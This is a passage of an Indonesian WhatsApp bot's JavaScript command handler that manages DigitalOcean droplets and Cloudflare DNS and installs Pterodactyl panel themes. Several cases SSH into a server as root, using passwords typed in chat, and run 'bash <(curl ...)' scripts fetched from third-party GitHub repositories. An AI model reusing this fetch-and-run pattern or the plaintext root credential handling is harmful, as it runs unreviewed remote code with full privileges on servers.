  text: "Pilih Domain Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "domain": {
if (!isCreator) return Reply(mess.owner)
if (!args[0]) return m.reply("Domain tidak ditemukan!")
if (isNaN(args[0])) return m.reply("Domain tidak ditemukan!")
const dom = Object.keys(global.subdomain)
if (Number(args[0]) > dom.length) return m.reply("Domain tidak ditemukan!")
if (!args[1].split("|")) return m.reply("Hostname/IP Tidak ditemukan!")
let tldnya = dom[args[0] - 1]
const [host, ip] = args[1].split("|")
async function subDomain1(host, ip) {
return new Promise((resolve) => {
axios.post(
`https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + global.subdomain[tldnya].apitoken,
"Content-Type": "application/json",
},
}).then((e) => {
let res = e.data
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content })
}).catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e
let err1Str = String(err1)
resolve({ success: false, error: err1Str })
})
})}
await subDomain1(host.toLowerCase(), ip).then(async (e) => {
if (e['success']) {
let teks = `
*Berhasil membuat subdomain ✅*\n\n*IP Server :* ${e['ip']}\n*Subdomain :* ${e['name']}
`
await m.reply(teks)
} else return m.reply(`${e['error']}`)
})
}
break
case "installtemanook":
case "temanook":
case "nooktheme": {
  if (!text || !text.includes('|')) {
    return m.reply("⚠️ Format salah!\n\nGunakan format:\n.temanook ip|password\n\nContoh:\n.nooktheme 192.168.1.10|mypassword");
  }
  const [ip, password] = text.split('|').map(v => v.trim());
  if (!ip || !password) return m.reply("❌ IP atau password tidak boleh kosong.");
  const { Client } = await import('ssh2');
  let ssh = new Client();
  m.reply('🔧 Menghubungkan ke VPS dan mulai instalasi tema Nook...');
  ssh.on('ready', () => {
    m.reply('✅ Terhubung ke VPS!\n▶️ Memulai proses instalasi Nook Theme...');
    ssh.exec(`bash -c "
set -e
cd /var/www/pterodactyl
php artisan down
curl -L https://github.com/Nookure/NookTheme/releases/latest/download/panel.tar.gz | tar -xzv
chmod -R 755 storage/* bootstrap/cache
command -v composer >/dev/null 2>&1 || { curl -sS https://getcomposer.org/installer | php && mv composer.phar /usr/local/bin/composer; }
composer install --no-dev --optimize-autoloader --no-interaction
php artisan view:clear
php artisan config:clear
php artisan migrate --seed --force
chown -R www-data:www-data /var/www/pterodactyl/*
php artisan queue:restart
php artisan up
"`, async (err, stream) => {
      if (err) {
        m.reply("❌ Gagal mengeksekusi perintah di VPS.");
        return ssh.end();
      }
      stream.on('data', (data) => {
        console.log(`[VPS stdout]: ${data.toString()}`);
      });
      stream.stderr.on('data', (data) => {
        console.error(`[VPS stderr]: ${data.toString()}`);
      });
      stream.on('close', async () => {
        await conn.sendMessage(m.chat, {
          text: '✅ *Nook Theme berhasil diinstal!*\nServer kembali online.',
          footer: `© 2025 Kyxzan-Official`,
          quoted: m
        });
        ssh.end();
      });
    });
  }).on('error', (err) => {
    m.reply(`❌ Gagal konek ke VPS:\n${err.message}`);
  }).connect({
    host: ip,
    port: 22,
    username: 'root',
    password: password
  });
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "temaelysium": case "installtemaelysium": {
    if (!isOwner) return Reply(mess.owner);
    if (!text || text.split("|").length < 2) return m.reply(example("ipvps|pwvps"));
    let [ipvps, passwd] = text.split("|");
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };
    const command = `bash <(curl -s https://raw.githubusercontent.com/LeXcZxMoDz9/kontol/refs/heads/main/bangke.sh)`;
    const ress = new Client();
    ress.on('ready', async () => {
        Reply("Memproses install *tema Elysium* pterodactyl\nTunggu 1-10 menit hingga proses selesai");
        ress.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', async (code, signal) => {
                await Reply("Berhasil install *tema Elysium* pterodactyl ✅");
                ress.end();
            }).on('data', async (data) => {
                console.log(data.toString());
                stream.write('1\n');
                stream.write('y\n');
                stream.write('yes\n');
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        Reply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "temanightcore": case "installtemanightcore": {
    if (!isOwner) return Reply(mess.owner);
    if (!text) return m.reply("username@ipvps|pwvps");
    let vii = text.split("|");
    if (vii.length < 2) return m.reply("username@ipvps|pwvps");
    let ipInput = vii[0];
    let passwd = vii[1];
    let uservps = "root"; 
    let ipvps = ipInput;
    if (ipInput.includes("@")) { 
        let splitIP = ipInput.split("@");
        uservps = splitIP[0]; 
        ipvps = splitIP[1];
    }
    const Settings = {
        host: ipvps,
        port: '22',
        username: uservps,
        password: passwd
    };
    const command = `bash <(curl -s https://raw.githubusercontent.com/NoPro200/Pterodactyl_Nightcore_Theme/main/install.sh)`;
    const ress = new Client();
    ress.on('ready', async () => {
        m.reply(`🔹 *Memproses install tema Nightcore*\nTunggu 1-10 menit...\n\n🖥️ VPS: ${ipvps}\n👤 User: ${uservps}`);
        ress.exec(command, (err, stream) => {
            if (err) throw err;

            stream.on('close', async (code, signal) => {    
                await m.reply("✅ *Tema Nightcore berhasil diinstall!*");
                ress.end();
            }).on('data', async (data) => {
                console.log(data.toString());
                stream.write('1\n');
                stream.write('y\n');
            }).stderr.on('data', (data) => {
                console.log('STDERR:', data.toString());
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error:', err);
        m.reply('❌ *Gagal terhubung!* Kata sandi, username, atau IP tidak valid.');
    }).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "installtemaenigma": case "instaltemaenigma": {
if (!isCreator) return Reply(mess.owner)
    if (!text) return m.reply("username@ipvps|pwvps|wa.me|link_channel|link_grup");
    let vii = text.split("|");
    if (vii.length < 2) return m.reply("username@ipvps|pwvps|wa.me|link_channel|link_grup");
    let ipInput = vii[0];
    let passwd = vii[1];
    let waMe = vii[2] || "https://wa.me/62895343084438"; 
    let linkChannel = vii[3] || "https://whatsapp.com/channel/0029VbBC3wJ2Jl8HFyy12s2K";
    let linkGrup = vii[4] || "https://whatsapp.com/channel/0029VbBC3wJ2Jl8HFyy12s2K";
    let uservps = "root"; 
    let ipvps = ipInput;
    if (ipInput.includes("@")) { 
        let splitIP = ipInput.split("@");
        uservps = splitIP[0]; 
        ipvps = splitIP[1];
    }
    const connSettings = {
        host: ipvps,
        port: '22',
        username: uservps,
        password: passwd
    };
    const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`;
    const ress = new Client();
    ress.on('ready', async () => {
        m.reply(`🔹 *Memproses install tema Enigma*\nTunggu 1-10 menit...\n\n🖥️ VPS: ${ipvps}\n👤 User: ${uservps}\n🔗 WA: ${waMe}\n📢 Channel: ${linkChannel}\n👥 Grup: ${linkGrup}`);
        ress.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', async (code, signal) => {    
                await m.reply("✅ *Tema Enigma berhasil diinstall!*");
                ress.end();
            }).on('data', async (data) => {
                console.log(data.toString());
                stream.write(`skyzodev\n`);
                stream.write(`1\n`);
                stream.write(`3\n`);
                stream.write(`${waMe}\n`);
                stream.write(`${linkGrup}\n`);
                stream.write(`${linkChannel}\n`);
                stream.write(`yes\n`);
                stream.write(`x\n`);
            }).stderr.on('data', (data) => {
                console.log('STDERR:', data.toString());
            });
        });
    }).on('error', (err) => {
        console.log('connection Error:', err);
        m.reply('❌ *Gagal terhubung!* Kata sandi, username, atau IP tidak valid.');
    }).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "installtemanebula": case "temanebula": {
if (!isCreator) return m.reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *thema Nebula* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema nebula* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write('2\n');
stream.write('\n');
stream.write('\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Kata sandi atau IP tidak valid');
}).connect(connSettings);
}
break

//=================================//

case "installtemastellar": case "installtemastelar": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *tema stellar* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema stellar* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`1\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Kata sandi atau IP tidak valid');
}).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "installtemabilling": case "instaltemabiling": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema billing* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema billing* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`2\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Kata sandi atau IP tidak valid');
}).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "installtema": case "installthema": {
 if (!text) return m.reply(`Contoh : ${prefix + command} ipvps|pwvps`);
 const safeText = typeof text === 'string' ? text : String(text || '');
 if (safeText.length > 100) return m.reply(`Karakter terbatas, max 100!`);
 try {
 const messageText = `Yuk pilih *thema* yang ingin kamu install! Klik tombol di bawah ini.`;
 await conn.sendMessage(m.chat, {
 image: { url: global.image.menu },
 caption: messageText,
 footer: 'Install Thema',
 buttons: [
 {
 buttonId: 'action',
 buttonText: { displayText: '🎨 Pilih Thema' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: 'Pilih Thema Pterodactyl',
 sections: [
 {
 title: '🔥 Thema Premium',
 rows: [
{ title: 'Tema Enigma', description: 'Ciptakan tampilan elegan dan misterius dengan Tema Enigma.', id: `${prefix}installtemaenigma ${safeText}` },
{ title: 'Tema Nook', description: 'Tampilan bersih dan modern untuk panel kamu dengan Tema Nook.', id: `${prefix}installtemanook ${safeText}` },
{ title: 'Tema Nightcore', description: 'Desain modern nan bersih, cocok untuk kamu yang suka nuansa gelap elegan.', id: `${prefix}installtemanightcore ${safeText}` },
{ title: 'Tema Elysium', description: 'Desain stylish dan premium hadir lewat Tema Elysium.', id: `${prefix}installtemaelysium ${safeText}` },
{ title: 'Tema Nebula', description: 'UI futuristik dan modern yang menawan dari Tema Nebula.', id: `${prefix}installtemanebula ${safeText}` },
{ title: 'Tema Stellar', description: 'Minimalis dan smooth — itulah Tema Stellar.', id: `${prefix}installtemastellar ${safeText}` },
{ title: 'Tema Billing', description: 'Tampilan rapi khusus untuk halaman billing kamu.', id: `${prefix}installtemabilling ${safeText}` }
 ]
 },
 {
 title: '💡 Lainnya',
 rows: [
 { title: 'Install Depend (Thema Nebula)', description: 'Wajib sebelum install Thema Nebula.', id: `${prefix}installdepend ${safeText}` }
 ]
 }
 ]
 })
 }
 }
 ],
 headerType: 4,
 viewOnce: true,
 contextInfo: {
 isForwarded: true,
 mentionedJid: [m.sender],
 externalAdReply: {
 title: global.botname2,
 thumbnailUrl: global.image.menu,
 sourceUrl: linkGrup,
 renderLargerThumbnail: true
 }
 }
 }, { quoted: m });
 } catch (error) {
 console.error('Error di case installtema:', error);
 m.reply('Terjadi kesalahan saat memproses perintah. Silakan coba lagi.');
 }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "installdepend": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
 
const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses installdepend pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => { 
await m.reply("Berhasil install Depend silakan ketik .installtemanebula ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write('11\n');
stream.write('A\n');
stream.write('Y\n');
stream.write('Y\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'listdroplet': {
if (!isCreator) return Reply(mess.owner)
try {
const getDroplets = async () => {
try {
const response = await fetch('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: "Bearer " + global.apiDigitalOcean
}
});
const data = await response.json();
return data.droplets || [];
} catch (err) {
m.reply('Error fetching droplets: ' + err);
return [];
}
};

getDroplets().then(droplets => {
let totalvps = droplets.length;
let mesej = `List droplet digital ocean kamu: ${totalvps}\n\n`;

if (droplets.length === 0) {
mesej += 'Tidak ada droplet yang tersedia!';
} else {
droplets.forEach(droplet => {
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
mesej += `Droplet ID: ${droplet.id}
Hostname: ${droplet.name}
Username: Root
IP: ${ipAddress}
Ram: ${droplet.memory} MB
Cpu: ${droplet.vcpus} CPU
OS: ${droplet.image.distribution}
Storage: ${droplet.disk} GB
Status: ${droplet.status}\n`;
});
}
conn.sendMessage(m.chat, { text: mesej }, {quoted: m});
});
} catch (err) {
m.reply('Terjadi kesalahan saat mengambil data droplet: ' + err);
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'restartvps': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text
const restartVPS = async (dropletId) => {
try {
const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

const response = await fetch(apiUrl, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
},
body: JSON.stringify({
type: 'reboot'
})
});

if (response.ok) {
const data = await response.json();
return data.action;
} else {
const errorData = await response.json();
m.reply(`Gagal melakukan restart VPS: ${errorData.message}`);
}
} catch (err) {
m.reply('Terjadi kesalahan saat melakukan restart VPS: ' + err);
}
};

restartVPS(dropletId)
.then((action) => {
m.reply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
})
.catch((err) => {
m.reply(err);
})

}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'rebuild': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text 
let rebuildVPS = async () => {
try {
// Rebuild droplet menggunakan API DigitalOcean
const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
},
body: JSON.stringify({
type: 'rebuild',
image: 'ubuntu-20-04-x64' // Ganti dengan slug image yang ingin digunakan untuk rebuild (misal: 'ubuntu-18-04-x64')
})
});

if (response.ok) {
const data = await response.json();
m.reply('Rebuild VPS berhasil dimulai. Status aksi:', data.action.status);
const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
}
});
if (vpsInfo.ok) {
const vpsData = await vpsInfo.json();
const droplet = vpsData.droplet;
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';

const textvps = `*VPS BERHASIL DI REBUILD*
IP VPS: ${ipAddress}
SYSTEM IMAGE: ${droplet.image.slug}`;
await sleep(60000) 
conn.sendMessage(m.chat, { text: textvps }, {quoted: m});
} else {
m.reply('Gagal mendapatkan informasi VPS setelah rebuild!');
}
} else {
const errorData = await response.json();
m.reply('Gagal melakukan rebuild VPS : ' + errorData.message);
}
} catch (err) {
m.reply('Terjadi kesalahan saat melakukan rebuild VPS : ' + err);
}};
rebuildVPS();
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "sisadroplet": {
if (!isCreator) return Reply(mess.owner)
async function getDropletInfo() {
try {
const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});

const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});

if (accountResponse.status === 200 && dropletsResponse.status === 200) {
const dropletLimit = accountResponse.data.account.droplet_limit;
const dropletsCount = dropletsResponse.data.droplets.length;
const remainingDroplets = dropletLimit - dropletsCount;

return {
dropletLimit,
remainingDroplets,
totalDroplets: dropletsCount,
};
} else {
return new Error('Gagal mendapatkan data akun digital ocean atau droplet!');
}
} catch (err) {
return err;
}}
async function sisadropletHandler() {
try {
if (!isCreator) return Reply(mess.owner)

const dropletInfo = await getDropletInfo();
m.reply(`Sisa droplet yang dapat kamu pakai: ${dropletInfo.remainingDroplets}

Total droplet terpakai: ${dropletInfo.totalDroplets}`);
} catch (err) {
reply(`Terjadi kesalahan: ${err}`);
}}
sisadropletHandler();
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "deldroplet": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text
let deleteDroplet = async () => {
try {
let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'DELETE',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
}
});

if (response.ok) {
m.reply('Droplet berhasil dihapus!');
} else {
const errorData = await response.json();
return new Error(`Gagal menghapus droplet: ${errorData.message}`);
}
} catch (error) {
console.error('Terjadi kesalahan saat menghapus droplet:', error);
m.reply('Terjadi kesalahan saat menghapus droplet.');
}};
deleteDroplet();
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "cvps": {
if (!text) return m.reply(example("hostname"))
return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Spesifikasi Vps',
          sections: [
            {
              title: 'List Ram & Cpu Vps',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Ram 16GB || CPU 4', 
                  id: `.r16c4 ${text}`
                },
                {
                  title: 'Ram 1GB || CPU 1', 
                  id: `.r1c1 ${text}`
                },
                {
                  title: 'Ram 2GB || CPU 1', 
                  id: `.r2c1 ${text}`
                },
                {
                  title: 'Ram 2GB || CPU 2', 
                  id: `.r2c2 ${text}`
                },
                {
                  title: 'Ram 4GB || CPU 2', 
                  id: `.r4c2 ${text}`
                },      
                {
                  title: 'Ram 8GB || CPU 4', 
                  id: `.r8c4 ${text}`
                }                     
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Spesifikasi Vps Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break
case "r1c1": case "r2c1": case "r2c2": case "r4c2": case "r8c4": case "r16c4": {
if (!isCreator) return Reply(mess.owner)
if (!text) return
    await sleep(1000)
    let images
    let region = "sgp1"
    if (command == "r1c1") {
    images = "s-1vcpu-1gb"
    } else if (command == "r2c1") {
    images = "s-1vcpu-2gb"
    } else if (command == "r2c2") {
    images = "s-2vcpu-2gb"
    } else if (command == "r4c2") {
    images = "s-2vcpu-4gb"
    } else if (command == "r8c4") {
    images = 's-4vcpu-8gb'
    } else {
    images = "s-4vcpu-16gb-amd"
    region = "sgp1"
    }
    let hostname = text.toLowerCase()
    if (!hostname) return m.reply(example("hostname"))
    
    try {        
        let dropletData = {
            name: hostname,
            region: region, 
            size: images,
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        let password = await  generateRandomPassword()
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apiDigitalOcean 
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            await m.reply(`Memproses pembuatan vps...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apiDigitalOcean
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `VPS berhasil dibuat!\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}`;

            await conn.sendMessage(m.chat, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        m.reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
    }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'iqc': {
    
    let inputText = args.length > 0 
        ? args.join(" ")
        : (m.quoted && m.quoted.text ? m.quoted.text : "");

    if (!inputText) {
        return m.reply(`Contoh Penggunaan:\n.iqc teks anda di sini\natau reply pesan dengan .iqc`);
    }

    function formatText(text) {
        const applyStyle = (text, map) => {
            let result = '';
            for (const char of text) {
                result += map[char] || char;
            }
            return result;
        };

        const styles = {
            bold: {
                'a':'𝗮','b':'𝗯','c':'𝗰','d':'𝗱','e':'𝗲','f':'𝗳','g':'𝗴','h':'𝗵','i':'𝗶','j':'𝗷','k':'𝗸','l':'𝗹','m':'𝗺','n':'𝗻','o':'𝗼','p':'𝗽','q':'𝗾','r':'𝗿','s':'𝘀','t':'𝘁','u':'𝘂','v':'𝘃','w':'𝘄','x':'𝘅','y':'𝘆','z':'𝘇',
                'A':'𝗔','B':'𝗕','C':'𝗖','D':'𝗗','E':'𝗘','F':'𝗙','G':'𝗚','H':'𝗛','I':'𝗜','J':'𝗝','K':'𝗞','L':'𝗟','M':'𝗠','N':'𝗡','O':'𝗢','P':'𝗣','Q':'𝗤','R':'𝗥','S':'𝗦','T':'𝗧','U':'𝗨','V':'𝗩','W':'𝗪','X':'𝗫','Y':'𝗬','Z':'𝗭'
            },
            italic: {
                'a':'𝘢','b':'𝘣','c':'𝘤','d':'𝘥','e':'𝘦','f':'𝘧','g':'𝘨','h':'𝘩','i':'𝘪','j':'𝘫','k':'𝘬','l':'𝘭','m':'𝘮','n':'𝘯','o':'𝘰','p':'𝘱','q':'𝘲','r':'𝘳','s':'𝘴','t':'𝘵','u':'𝘶','v':'𝘷','w':'𝘸','x':'𝘹','y':'𝘺','z':'𝘻',
                'A':'𝘈','B':'𝘉','C':'𝘊','D':'𝘋','E':'𝘌','F':'𝘍','G':'𝘎','H':'𝘏','I':'𝘐','J':'𝘑','K':'𝘒','L':'𝘓','M':'𝘔','N':'𝘕','O':'𝘖','P':'𝘗','Q':'𝘘','R':'𝘙','S':'𝘚','T':'𝘛','U':'𝘜','V':'𝘝','W':'𝘞','X':'𝘟','Y':'𝘠','Z':'𝘡'
            }
        };

        return text
            .replace(/\*(.*?)\*/g, (_, c) => applyStyle(c, styles.bold))
            .replace(/_(.*?)_/g, (_, c) => applyStyle(c, styles.italic))
            .replace(/~(.*?)~/g, (_, c) => c.split('').map(ch => ch + '\u0336').join(''));
    }

    await m.reply('⏳ Sedang membuat gambar...');

    try {
        const formattedText = formatText(inputText);

        const maxLength = 1000;
        let processedText = formattedText.length > maxLength
            ? formattedText.substring(0, maxLength) + '...'
            : formattedText;

        const time = new Intl.DateTimeFormat('id-ID', {
            timeZone: 'Asia/Jakarta',
            hour: '2-digit',
            minute: '2-digit',
            hour12: false
        }).format(new Date());
        const batteryPercentage = Math.floor(Math.random() * 100) + 1;

        const imageUrl = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&batteryPercentage=${batteryPercentage}&carrierName=INDOSAT&messageText=${encodeURIComponent(processedText.trim())}&emojiStyle=apple`;

        await conn.sendMessage(m.chat, {
            image: { url: imageUrl },
            caption: "✅ Success Nihh Mek"
        }, { quoted: m });

    } catch (error) {
        console.error("Error iqc:", error.message);
        return m.reply("⚠️ Terjadi kesalahan saat membuat gambar, coba ulangi.");
    }
}
break;
//=========================================//
case "reactch": case "rch": {
 if (!isCreator) return Reply('*[ System Notice ]* Khusus Owner');
 if (!text) return Reply(`Gini Cok Caranya\n\ncontoh: ${prefix + command} linkpesan 😂`);
 if (!args[0] || !args[1]) return Reply("Wrong Format");
 if (!args[0].includes("https://whatsapp.com/channel/")) return Reply("Link tautan tidak valid");

 let result = args[0].split('/')[4];
 let serverId = args[0].split('/')[5];
 let res = await conn.newsletterMetadata("invite", result);

 function convertToStyledFont(text) {
 const base = {
 '-': '➖', a: '🅐', b: '🅑', c: '🅒', d: '🅓', e: '🅔',
 f: '🅕', g: '🅖', h: '🅗', i: '🅘', j: '🅙',
 k: '🅚', l: '🅛', m: '🅜', n: '🅝', o: '🅞',
 p: '🅟', q: '🅠', r: '🅡', s: '🅢', t: '🅣',
 u: '🅤', v: '🅥', w: '🅦', x: '🅧', y: '🅨', z: '🅩',
 A: '🅐', B: '🅑', C: '🅒', D: '🅓', E: '🅔',
 F: '🅕', G: '🅖', H: '🅗', I: '🅘', J: '🅙',
 K: '🅚', L: '🅛', M: '🅜', N: '🅝', O: '🅞',
